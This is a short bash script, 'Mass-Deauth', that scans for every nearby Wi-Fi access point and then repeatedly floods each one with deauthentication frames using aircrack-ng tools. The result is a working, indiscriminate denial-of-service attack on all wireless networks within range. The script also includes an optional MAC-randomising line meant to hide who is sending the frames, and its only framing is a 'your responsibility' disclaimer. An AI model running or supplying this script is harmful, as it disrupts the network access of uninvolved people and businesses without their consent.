#!/bin/bash
# Mass-Deauth by deduti0n
# No copyrights, you want it? Use, edit it, do whatever the fuck you want with this.

function cleanup()
{

clear
echo "Exiting Monitor mode..."
airmon-ng stop wlan0mon &> /dev/null
}

function splash()
{
clear
echo "████████▄     ▄████████     ███      ▄█  ███▄▄▄▄"
echo "███   ▀███   ███    ███ ▀█████████▄ ███  ███▀▀▀██▄ "
echo "███    ███   ███    █▀     ▀███▀▀██ ███▌ ███   ███ "
echo "███    ███  ▄███▄▄▄         ███   ▀ ███▌ ███   ███ "
echo "███    ███ ▀▀███▀▀▀         ███     ███▌ ███   ███ "
echo "███    ███   ███    █▄      ███     ███  ███   ███ "
echo "███   ▄███   ███    ███     ███     ███  ███   ███ "
echo "████████▀    ██████████    ▄████▀   █▀    ▀█   █▀ "
echo "- MASS DEAUTHER. YOUR RESPOSABILITY. USE IT AT YOUR OWN RISK. -"
echo
echo
}

if [[ $EUID -ne 0 ]]; then
	echo "> Root or gtfo." 1>&2
	sleep 1; exit 1
fi

splash

echo " - Your wireless adapter:" # Make sure your interface isn't in monitor mode. Use "airmon-ng stop wlan0mon" or "airmon-ng stop mon0". (Quick tip for newbs)
read wi

splash

echo "(Scanning nearby AP's)..."
iwlist $wi scan > /tmp/scan.tmp
cat /tmp/scan.tmp | grep "Address" | cut -d \- -f 2 | sed -e "s/Address: //" > /tmp/APad.tmp # Saves the addresses of all nearby AP's 

splash

echo "(Starting monitor mode)..."

# Setup Monitor Mode
airmon-ng stop $wi &> /dev/null
airmon-ng start $wi &> /dev/null

trap cleanup EXIT

# Setup a Random Mac 
#ip link set wlan0mon down && macchanger -A wlan0mon && ip link set wlan0mon up

clear
echo "#     DEAUTH ATTACK STARTED     #"
echo "Remember, you fuck up. Your mess."
echo
echo

while true;do
	cat /tmp/APad.tmp | while read line
	do
		echo " \> (Deauthenticating $line)... "
		echo
	    aireplay-ng -0 10 -a $line wlan0mon &> /dev/null # You could change the number of packets so it changes faster of ap.
	done
done
